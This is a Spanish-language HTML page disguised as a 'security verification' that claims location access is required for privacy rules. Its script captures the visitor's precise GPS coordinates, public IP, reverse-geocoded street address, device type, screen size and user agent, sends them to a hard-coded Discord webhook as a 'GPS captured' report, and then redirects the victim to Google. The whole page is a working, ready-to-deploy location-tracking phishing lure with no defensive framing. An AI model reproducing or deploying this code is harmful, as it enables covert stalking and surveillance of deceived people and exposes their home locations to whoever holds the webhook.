<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificaci√≥n de Seguridad</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .icon { font-size: 4rem; margin-bottom: 20px; }
        h1 { color: #333; font-size: 1.8rem; margin-bottom: 15px; }
        p { color: #666; line-height: 1.6; margin-bottom: 25px; }
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }
        .btn:hover { transform: translateY(-2px); }
        .btn:active { transform: translateY(0); }
        .loader {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            display: none;
            margin-top: 20px;
            padding: 15px;
            background: #e8f5e9;
            border-radius: 10px;
            color: #2e7d32;
            font-weight: bold;
        }
        .error {
            display: none;
            margin-top: 20px;
            padding: 15px;
            background: #ffebee;
            border-radius: 10px;
            color: #c62828;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">üîê</div>
        <h1>Verificaci√≥n de Seguridad</h1>
        <p>Para acceder al contenido solicitado, necesitamos verificar tu ubicaci√≥n para cumplir con las regulaciones de privacidad.</p>
        <p style="font-size: 0.9rem; color: #999;">Este proceso es seguro y solo toma unos segundos.</p>
        
        <button class="btn" onclick="solicitarUbicacion()">‚úì Verificar Ubicaci√≥n</button>
        
        <div class="loader" id="loader"></div>
        <div class="status" id="status">‚úì Verificaci√≥n completada</div>
        <div class="error" id="error">‚ùå No se pudo obtener la ubicaci√≥n. Por favor, active el GPS y permita el acceso.</div>
    </div>

    <script>
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1462321256807530526/LWNvof3-5p65SyT7NAobTwT7__pn2Xniyqg2f_ia5a_anjEWaHvQ-2--RcEzu7SSbBqr";

        function detectarDispositivo() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) return "üì± Android";
            if (/iPad|iPhone|iPod/.test(ua)) return "üì± iOS";
            if (/Windows/.test(ua)) return "üíª Windows";
            if (/Mac/.test(ua)) return "üíª Mac";
            if (/Linux/.test(ua)) return "üíª Linux";
            return "‚ùì Desconocido";
        }

        async function solicitarUbicacion() {
            const btn = document.querySelector('.btn');
            const loader = document.getElementById('loader');
            const status = document.getElementById('status');
            const error = document.getElementById('error');

            btn.style.display = 'none';
            loader.style.display = 'block';

            if (!navigator.geolocation) {
                loader.style.display = 'none';
                error.style.display = 'block';
                error.textContent = '‚ùå Tu navegador no soporta geolocalizaci√≥n';
                return;
            }

            // Opciones de alta precisi√≥n
            const opciones = {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            };

            navigator.geolocation.getCurrentPosition(
                async function(position) {
                    // GPS OBTENIDO ‚úÖ
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const precision = position.coords.accuracy;

                    try {
                        // Obtener IP
                        const respIP = await fetch('https://api.ipify.org?format=json');
                        const dataIP = await respIP.json();
                        const ip = dataIP.ip;

                        // Obtener direcci√≥n desde coordenadas GPS (reverse geocoding)
                        const respGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
                        const geoData = await respGeo.json();

                        const direccion = geoData.address || {};
                        const tipoDispositivo = detectarDispositivo();

                        // Crear embed COMPLETO para Discord
                        const embed = {
                            embeds: [{
                                title: "üéØ UBICACI√ìN GPS CAPTURADA",
                                description: `**${tipoDispositivo}** capturado con √©xito`,
                                color: 0x00FF00,
                                thumbnail: {
                                    url: "https://cdn-icons-png.flaticon.com/512/684/684908.png"
                                },
                                fields: [
                                    {
                                        name: "üìç COORDENADAS GPS EXACTAS",
                                        value: `**Latitud:** ${lat}\n**Longitud:** ${lon}\n**Precisi√≥n:** ${precision.toFixed(2)} metros`,
                                        inline: false
                                    },
                                    {
                                        name: "üó∫Ô∏è VER EN MAPA",
                                        value: `[Google Maps](https://www.google.com/maps?q=${lat},${lon})\n[OpenStreetMap](https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=18)`,
                                        inline: false
                                    },
                                    {
                                        name: "üè† DIRECCI√ìN APROXIMADA",
                                        value: `**Calle:** ${direccion.road || 'N/A'}\n**Colonia:** ${direccion.suburb || direccion.neighbourhood || 'N/A'}\n**Ciudad:** ${direccion.city || direccion.town || 'N/A'}\n**Estado:** ${direccion.state || 'N/A'}\n**Pa√≠s:** ${direccion.country || 'N/A'}\n**CP:** ${direccion.postcode || 'N/A'}`,
                                        inline: false
                                    },
                                    {
                                        name: "üåê IP P√öBLICA",
                                        value: `\`${ip}\``,
                                        inline: true
                                    },
                                    {
                                        name: "üì± Dispositivo",
                                        value: tipoDispositivo,
                                        inline: true
                                    },
                                    {
                                        name: "üñ•Ô∏è Pantalla",
                                        value: `${screen.width}x${screen.height}`,
                                        inline: true
                                    },
                                    {
                                        name: "‚è∞ Timestamp",
                                        value: new Date().toLocaleString('es-ES'),
                                                                                inline: false
                                    },
                                    {
                                        name: "üì± User Agent",
                                        value: `\`\`\`${navigator.userAgent}\`\`\``,
                                        inline: false
                                    }
                                ],
                                footer: {
                                    text: "Sistema GPS Seeker v2.0"
                                },
                                timestamp: new Date().toISOString()
                            }]
                        };

                        // Enviar a Discord
                        await fetch(DISCORD_WEBHOOK, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(embed)
                        });

                        console.log('‚úÖ GPS enviado a Discord');

                        // Mostrar √©xito
                        loader.style.display = 'none';
                        status.style.display = 'block';

                        // Redirigir despu√©s de 2 segundos
                        setTimeout(() => {
                            window.location.href = 'https://www.google.com';
                        }, 2000);

                    } catch(e) {
                        console.error('Error:', e);
                        loader.style.display = 'none';
                        error.style.display = 'block';
                    }
                },
                function(err) {
                    // Error al obtener GPS
                    loader.style.display = 'none';
                    error.style.display = 'block';
                    
                    if (err.code === 1) {
                        error.textContent = '‚ùå Permiso denegado. Por favor, active la ubicaci√≥n y permita el acceso.';
                    } else if (err.code === 2) {
                        error.textContent = '‚ùå No se pudo obtener la ubicaci√≥n. Verifique su conexi√≥n GPS.';
                    } else if (err.code === 3) {
                        error.textContent = '‚ùå Tiempo de espera agotado. Intente nuevamente.';
                    }

                    btn.style.display = 'block';
                    btn.textContent = 'üîÑ Reintentar';
                },
                opciones
            );
        }
    </script>
</body>
</html>
